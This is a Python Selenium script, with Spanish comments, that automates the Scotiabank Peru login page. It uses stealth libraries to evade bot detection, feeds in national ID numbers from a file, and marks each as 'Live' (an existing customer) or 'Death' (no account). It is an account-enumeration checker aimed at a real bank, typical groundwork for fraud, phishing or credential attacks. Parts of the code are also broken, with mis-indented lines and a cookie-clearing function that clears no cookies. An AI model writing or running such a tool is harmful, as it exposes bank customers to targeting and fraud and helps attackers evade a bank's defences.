from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import random
from selenium_stealth import stealth as apply_stealth

class XPATHS:
    numDocumento = '//*[@id="mat-input-0"]'
    btn_continuar1 = '//*[@id="undefined"]/button'
    #ventanaDialogo = '//*[@id="mat-dialog-1"]'
    textoVentanaDialogo = '//*[@id="mat-dialog-1"]/div/p'


    textoVentanaDialogoERROR = '/html/body/div[2]/div[2]/div/mat-dialog-container/joy-dialog-error/div/mat-dialog-content/p'

    ingresarNumeroCajero = '//*[@id="mat-input-2"]'
    ingresarContrasena = '//*[@id="mat-input-1"]'

class Bot_Scotiabank:

    def __init__(self):
        # Configura las opciones para el controlador de Chrome
        options = uc.ChromeOptions()

        # Configura el tamaño de la ventana del navegador (por ejemplo, 800x600)
        options.add_argument("--disable-extensions")
options.add_argument("--disable-plugins-discovery")
options.add_experimental_option('excludeSwitches', ['enable-automation'])



        self.driver = uc.Chrome(options=options)

        # Aplicar medidas de "stealth" (evitar la detección)
        apply_stealth(self.driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            renderer="Intel Iris OpenGL Engine",
            fix_hairline=True
        )

    def clear_cookies(self):
        self.driver.execute_script("document.body.innerHTML = '';")

    def get_fase1(self):
        url = 'https://mi.scotiabank.com.pe/login'
        self.driver.get(url)

    def get_fase2(self, dni):
        wait0 = WebDriverWait(self.driver, 10)
        wait0.until(EC.visibility_of_element_located((By.XPATH, XPATHS.numDocumento)))
        self.driver.find_element(By.XPATH, XPATHS.numDocumento).send_keys(str(dni))
        self.driver.find_element(By.XPATH, XPATHS.btn_continuar1).click()

    def get_verificar_AbreTuCuenta(self):
        try:
            texto_ventana_dialogo = self.driver.find_element(By.XPATH, XPATHS.textoVentanaDialogo).text
            print(texto_ventana_dialogo)
        except:
            return False
        return True

    def get_verificar_LIVE(self):
        try:
            self.driver.find_element(By.XPATH, XPATHS.ingresarContrasena)
        except:
            return False
        return True

if __name__ == '__main__':
    with open('data.txt', 'r') as file:
        for line in file:
            dni = line.strip()

            bot = Bot_Scotiabank()

            bot.get_fase1()
            input()
            bot.get_fase2(dni)

            while True:
                time.sleep(0.2)

                if bot.get_verificar_AbreTuCuenta():
                    print('Death')
                    bot.clear_cookies()  # Elimina las cookies antes de la próxima iteración
                    break

                if bot.get_verificar_LIVE():
                    print("Live")
                    bot.clear_cookies()
                    break

            bot.driver.quit()
